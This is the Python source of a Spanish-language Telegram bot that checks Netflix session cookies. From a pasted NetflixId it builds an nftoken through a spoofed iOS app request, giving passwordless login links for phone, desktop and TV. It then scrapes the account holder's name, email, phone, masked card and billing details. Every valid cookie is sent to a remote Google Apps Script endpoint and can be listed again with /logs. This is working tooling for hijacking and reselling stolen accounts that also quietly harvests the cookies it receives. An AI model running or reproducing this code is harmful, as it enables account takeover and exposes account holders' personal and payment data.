import os
import asyncio
import logging
import re
from typing import Dict, Optional, Tuple
import time
from threading import Thread
import sys
import json
import codecs
import requests
import html
from flask import Flask
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# --- CONFIGURACIÓN ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
PORT = int(os.environ.get("PORT", 8000))
GAS_URL = os.environ.get("GOOGLE_SCRIPT_URL", "https://script.google.com/macros/s/AKfycbzTIesV8AfR1lQ8Nc4rAY-b776VyHm8CSLjjKJ6nOGXfIJnmPgifCbwe69HOJEc6gJ_4Q/exec")

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

app_flask = Flask(__name__)
application = None

START_TEXT = (
    "👋 Bot Verificador de Cookies de Netflix\n\n"
    "Pega tus cookies de Netflix aquí.\n\n"
    "Formatos aceptados:\n"
    "• Línea completa del encabezado `Cookie:`\n"
    "• Formato Netscape - separado por tabulaciones o espacios\n"
    "• Formato de matriz JSON\n"
    "• Pares Clave=Valor: NetflixId=...; SecureNetflixId=...; nfvdid=...\n\n"
    "Comandos:\n"
    "/start - Iniciar bot\n"
    "/help - Ayuda\n"
    "/logs - Mostrar cookies guardadas recientes\n\n"
    " Bot por @ritsurex 🦖"
)

HELP_TEXT = (
    "Cómo funciona:\n"
    "• Usa /start luego pega las cookies.\n"
    "• El bot valida las cookies usando la API de Netflix.\n"
    "• Si son válidas, el bot las convierte en un enlace de inicio de sesión (teléfono | PC | TV)\n"
    "• Las cookies se guardan automáticamente en Google Sheets.\n"
    "• Usa /logs para ver las entradas guardadas recientemente."
)

NETFLIX_COOKIE_NAMES = {
    'netflixid', 'securenetflixid', 'netflixcookies', '__secure-netflixcookies',
    'nfvdid', 'flwssn', 'OptanonConsent', 'dsca', 'memclid', 'profilesNewSession',
    'cL', 'netflix-sans-normal-3-loaded', 'netflix-sans-bold-3-loaded',
    'pas', 'OptanonAlertBoxClosed', 'hasSeenCookieDisclosure'
}

COOKIE_NAME_RE = re.compile(
    r"(?i)\b(netflixid|securenetflixid|netflixcookies|__secure-netflixcookies|"
    r"nfvdid|flwssn|OptanonConsent|dsca|memclid|profilesNewSession|cL|"
    r"netflix-sans-normal-3-loaded|netflix-sans-bold-3-loaded|pas|"
    r"OptanonAlertBoxClosed|hasSeenCookieDisclosure)\b"
)
COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)


def _is_json_cookie(text: str) -> bool:
    """Verifica si el texto es una matriz JSON de cookies."""
    text = text.strip()
    if not (text.startswith('[') and text.endswith(']')):
        return False
    try:
        json.loads(text)
        return True
    except:
        return False


def _is_netscape_cookie(text: str) -> bool:
    """Verifica si el texto es formato Netscape (separado por tab o espacio)."""
    lines = text.strip().split('\n')
    if len(lines) < 1:
        return False

    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue

        # Primero intenta separador tabulado
        if '\t' in line:
            parts = line.split('\t')
            if len(parts) >= 7:
                logger.debug(f"Se detectó formato Netscape separado por tabulaciones")
                return True
        else:
            # Intenta separador por espacios (análisis más flexible)
            parts = line.split()
            if len(parts) >= 7:
                # Valida que parezca formato Netscape
                # Formato: dominio flag ruta seguro expiración nombre valor
                domain = parts[0]
                flag = parts[1]
                path = parts[2]
                secure = parts[3]
                try:
                    expiration = int(parts[4])
                    name = parts[5]
                    # Todo después del nombre es el valor
                    if domain.startswith('.') and flag in ['TRUE', 'FALSE'] and path == '/' and secure in ['TRUE', 'FALSE']:
                        logger.debug(f"Se detectó formato Netscape separado por espacios")
                        return True
                except (ValueError, IndexError):
                    continue

    return False


def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()
    return t.startswith("cookie:") or (";" in text and "=" in text)


def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    """Extrae cookies de formato de matriz JSON."""
    try:
        cookies_array = json.loads(json_str)
        kv: Dict[str, str] = {}

        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name = cookie_obj.get('name', '')
                    value = cookie_obj.get('value', '')
                    if name and value:
                        kv[name] = value
        return kv
    except Exception as e:
        logger.error(f"Error al analizar cookies JSON: {e}")
        return {}


def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    """Extrae cookies de formato Netscape (maneja tanto tabulaciones como espacios)."""
    kv: Dict[str, str] = {}
    lines = netscape_str.strip().split('\n')

    for line in lines:
        original_line = line
        line = line.strip()

        if not line or line.startswith('#'):
            continue

        # Determina delimitador (tabulación o espacio)
        if '\t' in line:
            # Formato tabulado
            parts = line.split('\t')
            delimiter = '\t'
        else:
            # Formato por espacios (más complejo)
            parts = line.split()
            delimiter = ' '

        if len(parts) >= 7:
            try:
                if delimiter == '\t':
                    # Formato tab: dominio flag ruta seguro expiración nombre valor
                    domain = parts[0]
                    flag = parts[1]
                    path = parts[2]
                    secure = parts[3]
                    expiration = parts[4]
                    name = parts[5]
                    value = parts[6]
                else:
                    # Formato espacio: dominio flag ruta seguro expiración nombre valor...
                    domain = parts[0]
                    flag = parts[1]
                    path = parts[2]
                    secure = parts[3]
                    try:
                        expiration = int(parts[4])
                    except ValueError:
                        continue
                    name = parts[5]
                    # Todo después de la posición 6 es parte del valor (para separado por espacios)
                    # Reconstruye el valor desde la línea original
                    # Formato: dominio flag ruta seguro expiración nombre valor
                    match = re.match(
                        r'^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$',
                        line
                    )
                    if match:
                        value = match.group(7).strip()
                    else:
                        value = ' '.join(parts[6:])

                if name and value:
                    kv[name] = value
                    logger.debug(f"Cookie extraída: {name}")
            except (ValueError, IndexError) as e:
                logger.debug(f"Fallo al analizar línea de cookie Netscape: {line}, error: {e}")
                continue

    logger.info(f"Se extrajeron {len(kv)} cookies del formato Netscape")
    return kv


def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]

    kv: Dict[str, str] = {}
    for part in parts:
        m = COOKIE_KV_RE.match(part)
        if m:
            k = m.group(1).strip()
            v = m.group(2).strip()
            kv[k] = v

    return kv


def _build_cookie_header(cookie_input: str) -> Optional[str]:
    """Analiza cualquier formato de cookie y construye una cadena de encabezado cookie."""

    logger.info("Intentando analizar cookies...")

    # Prueba formato JSON primero
    if _is_json_cookie(cookie_input):
        logger.info("Se detectó formato de cookie JSON")
        kv = _extract_json_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])

    # Prueba formato Netscape (tabulado o separado por espacios)
    if _is_netscape_cookie(cookie_input):
        logger.info("Se detectó formato de cookie Netscape")
        kv = _extract_netscape_cookies(cookie_input)
        if kv:
            result = "; ".join([f"{k}={v}" for k, v in kv.items()])
            logger.info(f"Se analizaron exitosamente {len(kv)} cookies del formato Netscape")
            return result

    # Prueba encabezado cookie o formato clave=valor
    if _looks_like_cookie_header(cookie_input):
        logger.info("Se detectó encabezado Cookie o formato clave=valor")
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
        if "=" not in cleaned:
            return None

        kv = _extract_cookie_kv_pairs(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])

        # Devuelve tal cual si ya está en formato clave=valor
        return cleaned

    # Último recurso: intenta analizar como pares clave=valor
    logger.info("Intentando analizar como pares clave=valor")
    kv = _extract_cookie_kv_pairs(cookie_input)
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])

    logger.warning("No se pudieron analizar las cookies en ningún formato")
    return None


def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = []
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            k = token.split("=", 1)[0].strip()
            names.append(k)
    names = [n for n in names if n]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")


NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        if k.strip().lower() == "netflixid":
            return v.strip()
    return None


def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
    if not netflix_id:
        return False, "Cookie inválida o expirada. No se encontró NetflixId.", None

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            timeout=timeout_s,
            verify=False,
        )
        r.raise_status()
        data = r.json()

        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        nftoken = td.get("token")

        if not nftoken:
            return False, "Cookie inválida o expirada. Falló la generación del token.", None

        return True, "La API de tokens devolvió un nftoken válido.", nftoken
    except Exception as e:
        logger.error(f"Error al generar nftoken: {e}")
        return False, "Cookie inválida o expirada.", None


def _scrub_text(text: str) -> str:
    if not text:
        return "Desconocido"
    return str(text)

def decode_text(value):
    if value is None:
        return "Desconocido"

    value = str(value)

    try:
        # Decodifica \x20, \uXXXX, etc.
        value = codecs.decode(value, "unicode_escape")
    except Exception:
        pass

    # Decodifica entidades HTML
    value = html.unescape(value)

    # Elimina cualquier secuencia de escape restante
    value = re.sub(r'\\x([0-9A-Fa-f]{2})',
                   lambda m: bytes.fromhex(m.group(1)).decode('latin1'),
                   value)

    return value.strip()

def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
    cookie_dict: Dict[str, str] = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        cookie_dict[k.strip()] = v.strip()

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No se encontró NetflixId en las cookies"}

    session = requests.Session()
    session.cookies.update(cookie_dict)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }

    urls = [
        "https://www.netflix.com/YourAccount",
        "https://www.netflix.com/account",
        "https://www.netflix.com/account/membership",
    ]

    try:
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
                if r.status_code == 200 and "Cuenta" in (r.text or ""):
                    resp = r
                    txt = r.text or ""
                    break
            except Exception:
                continue

        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}

        if ("iniciar sesión" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
            return {"ok": False, "reason": "Redirigido a inicio de sesión"}

        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)
            return decode_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = plan_raw or None
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )
        email = (
            find(r'"emailAddress"\s*:\s*"([^"]+)"')
            or find(r'"email"\s*:\s*"([^"]+)"')
            or find(r'"loginId"\s*:\s*"([^"]+)"')
        )
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        )
        plan_price = (
            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        )
        payment = (
            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        )
        card = (
            find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
            or find(r'"displayText"\s*:\s*"([^"]+)"')
        )
        phone = (
            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        )
        phone_ver = "Sí" if re.search(r'"isVerified":true', txt) else "No" if re.search(r'"isVerified":false', txt) else None
        quality = (
            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        )
        streams = (
            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        )
        hold = "Sí" if re.search(r'"isUserOnHold":true', txt) else "No" if re.search(r'"isUserOnHold":false', txt) else None
        extra = "Sí" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No" if re.search(r'"showExtraMemberSection"', txt) else None
        email_ver = "Sí" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No" if re.search(r'"emailVerified"\s*:\s*false', txt) else None
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid":\s*"([^"]+)"')

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None

        is_prem = ms == "CURRENT_MEMBER" if ms else bool(plan and "free" not in str(plan).lower())
        has_account = ("Cuenta" in txt)
        if not has_account:
            return {"ok": False, "reason": "No se encontraron datos de cuenta"}

        profiles: list = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        def decode_profile_name(name):
           try:
              name = codecs.decode(name, "unicode_escape")
           except Exception:
              pass
           return html.unescape(name)

        profiles_str = (
          ", ".join(decode_profile_name(_scrub_text(p)) for p in profiles)
          if profiles else None
       )

        return {
            "ok": True,
            "premium": str(is_prem),
            "name": name or "Desconocido",
            "country": country or "Desconocido",
            "plan": plan or "Desconocido",
            "plan_price": plan_price or "Desconocido",
            "member_since": member_since or "Desconocido",
            "next_billing": next_billing or "Desconocido",
            "payment_method": payment or "Desconocido",
            "masked_card": card or "Desconocido",
            "phone": phone or "Desconocido",
            "phone_verified": phone_ver or "Desconocido",
            "video_quality": quality or "Desconocido",
            "max_streams": streams or "Desconocido",
            "on_payment_hold": hold or "Desconocido",
            "extra_member": extra or "Desconocido",
            "email_verified": email_ver or "Desconocido",
            "email": email or "Desconocido",
            "profiles": profiles_str or "Desconocido",
            "user_guid": guid or "Desconocido",
            "membership_status": ms or "Desconocido",
        }
    except Exception as e:
        logger.error(f"Error al verificar cookie de Netflix: {e}")
        return {"ok": False, "reason": str(e)}

async def send_to_google_sheets(userId, username, cookie):
    """Envía datos a Google Apps Script"""
    payload = {
        "action": "add",
        "userId": str(userId),
        "username": username,
        "cookie": cookie
    }
    try:
        # Usando requests.post con json=payload asegura el content-type correcto
        response = requests.post(GAS_URL, json=payload, timeout=10)
        if response.status_code == 200:
            logger.info(f"Datos enviados a GAS para el usuario {userId}")
            return True
        else:
            logger.error(f"Error GAS {response.status_code}: {response.text}")
            return False
    except Exception as e:
        logger.error(f"Error al enviar a GAS: {e}")
        return False

async def fetch_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Obtiene registros recientes de Google Sheets vía GAS"""
    msg = await update.message.reply_text("⏳ Obteniendo registros...")

    try:
        # Asume que tu script GAS tiene una acción 'getLogs' o similar
        # Si aún no agregaste 'getLogs' a tu script GAS, esto fallará.
        # Por ahora, asumimos un fetch genérico.
        # NOTA: Necesitas agregar una función doGet en GAS para manejar 'action=getLogs'

        payload = {"action": "getLogs"}
        response = requests.get(GAS_URL, params=payload, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list):
                logs_text = "📜 Cookies Guardadas Recientes:\n\n"
                for i, log in enumerate(data[-5:], 1): # Últimas 5
                    logs_text += f"{i}. Usuario: {log.get('userId', 'N/A')}\n"
                    logs_text += f"   Cookie: {log.get('cookie', 'N/A')[:50]}...\n\n"
                await msg.edit_text(logs_text, parse_mode="Markdown")
            else:
                await msg.edit_text("No se encontraron registros o formato inválido.")
        else:
            await msg.edit_text(f"Error al obtener registros: {response.status_code}")

    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        logger.info(f"📱 /start desde {update.effective_user.id}")
        await update.message.reply_text(START_TEXT, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error en start: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        logger.info(f"❓ /help desde {update.effective_user.id}")
        await update.message.reply_text(HELP_TEXT)
    except Exception as e:
        logger.error(f"Error en help: {e}")

async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user_id = update.effective_user.id
        cookie_input = (update.message.text or "").strip()
        logger.info(f"📨 Mensaje de {user_id}: {len(cookie_input)} caracteres")

        if not cookie_input:
            await update.message.reply_text("Por favor pega tus cookies.")
            return

        cookie_header = _build_cookie_header(cookie_input)
        if not cookie_header:
            await update.message.reply_text(
                "❌ No se pudieron analizar las cookies.\n\n"
                "Pega en uno de estos formatos:\n"
                "• Línea completa del encabezado `Cookie:`\n"
                "• Formato Netscape (.txt de cookies) - **tanto tabulaciones como espacios**\n"
                "• Formato de matriz JSON\n"
                "• Pares Clave=Valor (NetflixId=..., SecureNetflixId=..., ...)\n\n"
                "Luego envía de nuevo."
            )
            return

        preview = _safe_preview_cookie_keys(cookie_header)
        msg = await update.message.reply_text(
            f"🔎 Verificando cookies de Netflix...\n"
            f"(Nombres de cookies detectados: {preview})"
        )

        loop = asyncio.get_running_loop()
        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

        if ok and nftoken:
            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)

            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={nftoken}"

            phone_html = f'<a href="{phone_link}">Abrir enlace</a>'
            desktop_html = f'<a href="{desktop_link}">Abrir enlace</a>'
            tv_html = f'<a href="{tv_link}">Abrir enlace</a>'

            acct_ok = bool(acct and acct.get("ok") is True)
            status_line = f"Verificación: {detail}\n"

            acct_html = ""
            if acct_ok:
                acct_html = (
                    "<b>Detalles de la cuenta</b>:\n"
                    f"• Nombre: {html.escape(str(acct.get('name','Desconocido')))}\n"
                    f"• Plan: {html.escape(str(acct.get('plan','Desconocido')))} ({html.escape(str(acct.get('plan_price','Desconocido')))})\n"
                    f"• Perfiles: {html.escape(str(acct.get('profiles','Desconocido')))}\n"
                    f"• País: {html.escape(str(acct.get('country','Desconocido')))}\n"
                    f"• Email: {html.escape(str(acct.get('email','Desconocido')))}\n"
                    f"• Miembro desde: {html.escape(str(acct.get('member_since','Desconocido')))}\n"
                    f"• Próximo cobro: {html.escape(str(acct.get('next_billing','Desconocido')))}\n"
                    f"• En retención de pago: {html.escape(str(acct.get('on_payment_hold','Desconocido')))}\n"
                    f"• Pago: {html.escape(str(acct.get('payment_method','Desconocido')))} / {html.escape(str(acct.get('masked_card','Desconocido')))}\n"
                    f"• Máx. transmisiones: {html.escape(str(acct.get('max_streams','Desconocido')))}\n"
                    f"• Teléfono: {html.escape(str(acct.get('phone','Desconocido')))} (verificado: {html.escape(str(acct.get('phone_verified','Desconocido')))})\n"
                    f"• Calidad del plan: {html.escape(str(acct.get('video_quality','Desconocido')))}\n"
                )

            status_html = html.escape(status_line)

            await msg.edit_text(
                "✅ Cookie válida detectada.\n\n"
                "Enlaces de inicio de sesión:\n"
                f"📱 Teléfono: {phone_html}\n"
                f"🖥️ Escritorio: {desktop_html}\n"
                f"📺 TV: {tv_html}\n"
                f"\n{status_html}"
                f"{acct_html}",
                parse_mode="HTML",
                disable_web_page_preview=True,
            )

            # Guarda en Google Sheets asíncronamente
            username = update.effective_user.username or f"usuario_{user_id}"
            await loop.run_in_executor(None, send_to_google_sheets, user_id, username, cookie_header)

            logger.info(f"✅ Validación de cookie exitosa para {user_id}")
        else:
            await msg.edit_text(f"❌ {detail}")
            logger.warning(f"❌ Validación de cookie fallida para {user_id}: {detail}")
    except Exception as e:
        logger.error(f"Error en handle_cookie_text: {e}", exc_info=True)
        try:
            await update.message.reply_text(f"❌ Error al procesar la solicitud")
        except:
            pass


def run_bot_in_thread():
    """Ejecuta el bot en un hilo separado con manejo de señales deshabilitado"""
    global application

    logger.info("=" * 60)
    logger.info("🤖 BOT VERIFICADOR DE COOKIES DE NETFLIX")
    logger.info("=" * 60)

    if not BOT_TOKEN:
        logger.error("❌ ¡BOT_TOKEN no establecido!")
        return

    try:
        # Crea un nuevo bucle de eventos para este hilo
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        logger.info("✅ Bucle de eventos creado")
        logger.info("🏗️ Construyendo aplicación...")

        # Construye la aplicación
        application = ApplicationBuilder().token(BOT_TOKEN).build()

        logger.info("✅ Aplicación construida exitosamente")
        logger.info("📌 Agregando manejadores...")

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("logs", fetch_logs))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))

        logger.info("✅ Manejadores registrados")
        logger.info("🚀 Iniciando polling...\n")

        # Ejecuta polling SIN manejadores de señales (no funcionan en hilos)
        loop.run_until_complete(
            application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                stop_signals=()  # Deshabilita manejo de señales en el hilo
            )
        )

    except Exception as e:
        logger.error(f"❌ Error del bot: {e}", exc_info=True)
        application = None
    finally:
        logger.info("🛑 Bot detenido")


# Rutas de Flask
@app_flask.route("/", methods=["GET"])
def index():
    bot_status = "🟢 Ejecutándose" if application else "🔴 Detenido"
    return f"""
    <html>
        <head>
            <title>Bot Verificador de Cookies de Netflix</title>
            <style>
                body {{ font-family: Arial; margin: 40px; background-color: #f5f5f5; }}
                .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .status {{ padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .running {{ background-color: #d4edda; color: #155724; }}
                .stopped {{ background-color: #f8d7da; color: #721c24; }}
                h1 {{ color: #333; }}
                a {{ color: #007bff; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ Bot Verificador de Cookies de Netflix</h1>
                <div class="status {'running' if application else 'stopped'}">
                    <p><b>Estado del Bot:</b> {bot_status}</p>
                    <p><b>BOT_TOKEN:</b> {'✅ Establecido' if BOT_TOKEN else '❌ No Establecido'}</p>
                    <p><b>Enlace del Bot: <a href="https://t.me/Cook2linkbot">Redirigir</a></b></p>
                    <p><b>Puerto:</b> {PORT}</p>
                </div>
                <hr>
                <p><a href="/health">Verificar Salud</a></p>
            </div>
        </body>
    </html>
    """, 200


@app_flask.route("/health", methods=["GET"])
def health():
    status = "saludable" if application else "no saludable"
    return {
        "status": status,
        "bot_running": application is not None,
        "bot_token_set": bool(BOT_TOKEN),
        "timestamp": time.time()
    }, 200 if application else 503


if __name__ == "__main__":
    logger.info(f"\n📌 PUERTO: {PORT}")
    logger.info(f"📌 BOT_TOKEN: {'✅ ESTABLECIDO' if BOT_TOKEN else '❌ NO ESTABLECIDO'}\n")

    if not BOT_TOKEN:
        logger.error("❌ ¡La variable de entorno BOT_TOKEN no está establecida!")
        sys.exit(1)

    # Inicia el bot en un hilo de fondo
    bot_thread = Thread(target=run_bot_in_thread, daemon=False)
    bot_thread.start()

    # Espera a que el bot se inicialice
    time.sleep(5)

    # Ejecuta Flask
    logger.info(f"🚀 Iniciando servidor Flask en el puerto {PORT}\n")

    try:
        app_flask.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
    except KeyboardInterrupt:
        logger.info("🛑 Interrupción de teclado")
        sys.exit(0)
